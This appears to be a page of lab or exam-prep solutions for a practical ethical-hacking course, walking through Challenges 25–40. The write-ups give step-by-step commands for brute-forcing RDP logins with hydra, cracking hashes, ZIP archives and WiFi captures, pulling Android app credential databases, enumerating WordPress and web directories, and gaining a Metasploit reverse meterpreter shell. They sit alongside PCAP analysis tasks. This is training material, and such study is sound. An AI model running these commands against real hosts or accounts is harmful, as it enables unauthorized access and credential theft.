---

#### Challenge 25: Crack RDP Credentials {#challenge-25}
**Domain:** 2 — System Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Crack the Windows RDP password for user "Admin".
**Answer Format:** AaaAaa*aaaa

**Solution:**
1. `nmap -p 3389 192.168.1.0/24` (find RDP)
2. `hydra -l Admin -P rockyou.txt rdp://[HOST]:3389 -v`
3. Wait for the successful login message
4. Extract the password

---

#### Challenge 26: Find Encrypted Password in Registry {#challenge-26}
**Domain:** 2 — System Hacking | **Difficulty:** Medium | **Time:** 15 min
**Question:** Connect via RDP with cracked credentials, find the password stored in the registry.
**Answer Format:** AaaaaaAaa*AAA

**Solution:**
1. `xfreerdp /u:Admin /p:PASSWORD /v:192.168.1.50`
2. Open Command Prompt
3. `reg query HKLM\Software\Microsoft\Windows /s | findstr /i password`
4. Extract the found password

---

#### Challenge 27: Advanced ADB Workflows {#challenge-27}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Medium | **Time:** 20 min
**Question:** Find the database with login credentials on an Android device.
**Answer Format:** Variable (credentials from database)

**Solution:**
1. `adb root`
2. `adb shell ls /data/data/ | grep -i app_name`
3. `adb pull /data/data/com.example.banking/databases/users.db ./`
4. `sqlite3 users.db`
5. `.tables`
6. `SELECT * FROM users;`

---

#### Challenge 28: Hash Cracking {#challenge-28}
**Domain:** 4 — Cryptography | **Difficulty:** Easy | **Time:** 10 min
**Question:** Crack the MD5 hash to find the password.
**Answer Format:** AaaAaa*Aaaa

**Solution:**
1. `hashid hash_value`
2. `hashcat -m 0 -a 0 hashfile rockyou.txt`
3. Wait for the match
4. Extract the password

---

#### Challenge 29: PE File Version Extraction {#challenge-29}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the File Version number from Ghostware.exe.
**Answer Format:** N.N.N.N (e.g., 2.3.4.5)

**Solution:**
1. Launch DIE (Detect It Easy)
2. File → Open → Ghostware.exe
3. Click "File Info" in the right pane
4. Look for the "Version" / "FileVersion" field
5. Extract the version number

---

#### Challenge 30: RAT Detection in PCAP {#challenge-30}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Analyze traffic to identify RAT activity and extract attacker details.
**Answer Format:** Variable (IP, port, commands)

**Solution:**
1. Open the PCAP in Wireshark
2. Look for unusual outbound connections
3. Filter: `ip.src == 192.168.1.50 && tcp.dstport != 80,443,53`
4. Right-click → Follow TCP Stream
5. Identify attacker IP, port, and commands

---

#### Challenge 31: Steganography Extraction {#challenge-31}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 10-15 min
**Question:** Extract hidden data from an image file.
**Answer Format:** AaaAaa*Aaaa

**Solution:**
1. `steghide info image.jpg`
2. `steghide extract -sf image.jpg -p ""`
3. `cat secret.txt`

---

#### Challenge 32: DDoS Attack — Identify Attacker {#challenge-32}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Medium | **Time:** 15 min
**Question:** Analyze traffic targeting 172.22.10.10, identify the Windows attacker IP and OS.
**Answer Format:** NN.NN.NN.NN

**Solution:**
1. Open the PCAP in Wireshark
2. Filter: `ip.dst == 172.22.10.10`
3. Statistics → Endpoints
4. Find the IP with the highest packet count
5. Check TTL values (128 = Windows)
6. Extract the attacker IP

---

#### Challenge 33: Metasploit Exploitation — Gain Shell {#challenge-33}
**Domain:** 2 — System Hacking | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** Exploit the vulnerable service on the target host and retrieve the flag from the compromised user's Desktop.
**Answer Format:** Variable (flag string, e.g., FLAG{...})

**Solution:**
1. Identify the service: `nmap -sV -p- [TARGET]`
2. Launch Metasploit: `msfconsole -q`
3. Search the matching module: `search [service name]`
4. `use exploit/[matched/module/path]`
5. `set RHOSTS [TARGET]` and `set LHOST [YOUR_IP]`
6. (If needed) `set PAYLOAD windows/meterpreter/reverse_tcp`
7. `exploit`
8. In the session: `shell` → `type C:\Users\<user>\Desktop\flag.txt` (or `cat` on Linux targets)

---

#### Challenge 34: WordPress Enumeration with WPScan {#challenge-34}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Enumerate the target WordPress site and identify the version of the vulnerable plugin.
**Answer Format:** N.N.N (e.g., 1.5.2)

**Solution:**
1. Confirm WordPress: `whatweb http://192.168.1.50`
2. Enumerate plugins + users: `wpscan --url http://192.168.1.50 --enumerate vp,u`
3. (With API token for CVE data) `wpscan --url http://192.168.1.50 --enumerate vp --api-token [TOKEN]`
4. Locate the flagged plugin and read its **Version** line
5. Extract the version number

---

#### Challenge 35: Crack a Password-Protected Archive {#challenge-35}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 15 min
**Question:** Crack the password-protected ZIP archive and read the secret file inside.
**Answer Format:** Variable (contents of the secret file)

**Solution:**
1. Extract the hash: `zip2john secret.zip > zip.hash`
2. Crack it: `john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash`
3. Show the password: `john --show zip.hash`
4. Unzip with it: `unzip -P [password] secret.zip`
5. `cat secret.txt` to read the answer

---

#### Challenge 36: Path Traversal / Directory Enumeration {#challenge-36}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the hidden admin directory on the web server.
**Answer Format:** /admin*area

**Solution:**
1. `nikto -h http://192.168.1.50`
2. Or: `gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt`
3. Look for 200/301 responses (found directories)
4. Test found directories in a browser
5. Identify the admin-related directory

---

#### Challenge 37: IoT Firmware Analysis {#challenge-37}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Extract the IoT device firmware image and find the hardcoded admin credentials.
**Answer Format:** Variable (user:password)

**Solution:**
1. Inspect the image: `binwalk firmware.bin`
2. Extract the filesystem: `binwalk -e firmware.bin`
3. Search for credentials in the extracted root:
   - `grep -riE "password|passwd|admin" _firmware.bin.extracted/`
   - `strings firmware.bin | grep -iE "admin|root|pass"`
4. Inspect `/etc/passwd` and `/etc/shadow` in the extracted filesystem
5. Extract the hardcoded user:password pair

---

#### Challenge 38: IoT Protocol — MQTT Topic Extraction {#challenge-38}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the IoT Publish message in traffic and extract the topic name.
**Answer Format:** Aaaa*Aaaa (e.g., home/temperature)

**Solution:**
1. Open the PCAP in Wireshark
2. Filter: `mqtt.msgtype == 3`
3. Look for PUBLISH packets
4. Expand the MQTT section in packet details
5. Find the "Topic Name" field and extract it

---

#### Challenge 39: Advanced Traffic Analysis — Data Exfiltration {#challenge-39}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Identify data exfiltration in the traffic — extract the stolen files/credentials.
**Answer Format:** Variable

**Solution:**
1. Open the PCAP in Wireshark
2. Look for large outbound transfers
3. Filter: `ip.src == [internal_ip] && ip.dst != [internal_network]`
4. Identify the protocol (FTP, SMB, HTTP)
5. Follow TCP Stream for the complete data
6. Extract file contents or credentials

---

#### Challenge 40: WiFi Cracking — Extract Last 4 Characters {#challenge-40}
**Domain:** 7 — Wireless | **Difficulty:** Easy | **Time:** 10-15 min
**Question:** Crack the WiFi password from Credmapwifi.cap and provide the last 4 characters.
**Answer Format:** aaaN (e.g., pass1)

**Solution:**
1. `aircrack-ng Credmapwifi.cap`
2. Find the BSSID: `AA:BB:CC:DD:EE:FF`
3. `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF Credmapwifi.cap`
4. Read: `KEY FOUND! [ PasswordHere ]`
5. Extract the last 4 characters

---

[← Back to challenge index](./){: .btn }
